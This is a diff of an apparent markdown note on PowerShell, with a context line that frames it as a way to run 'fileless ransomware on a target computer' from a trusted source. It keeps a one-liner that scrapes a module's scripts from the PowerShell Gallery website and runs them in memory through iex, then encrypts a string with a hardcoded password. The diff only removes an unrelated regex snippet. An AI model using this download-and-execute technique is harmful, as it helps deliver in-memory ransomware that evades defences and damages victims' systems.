@@ -21,26 +21,6 @@ We could run fileless ransomware on a target computer all from a trusted source
 $u="powershellgallery.com";foreach($m in ([regex]::Matches((irm "$u/packages/PsAES"),'<a\s+[^>]*href="([^"]+\.ps1)"[^>]*>'))){([regex]::Matches((irm "$u$($m.Groups[1].Value)"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)}) -replace '<(?!#)[^>]+>|(?<!<#)>(?![^#])',''|iex};$encryptedMessage = Protect-AESMessage -Message "Sensitive Data" -Password "89c57yj78754cth8"
 ```
 
-# Get Current Version
-
-```powershell
-# Define the regex pattern to extract content from <h2> within the specified <article> class
-$pattern = '<article class="col-sm-12 col-md-8 package-details-main special-margin-left">.*?<h2>(.*?)</h2>'
-
-# Perform the regex match
-$match = [regex]::Match($html, $pattern, [System.Text.RegularExpressions.RegexOptions]::Singleline)
-
-# Extract the value
-if ($match.Success) {
-    $h2Content = $match.Groups[1].Value.Trim()
-    # Output the content of the <h2> tag
-    $h2Content
-} else {
-    "No <h2> tag found within the specified <article> class."
-}
-```
-
-
 You can use this function to grab the links of all the .ps1 files in a module from the powershell gallery website
 
 ```powershell
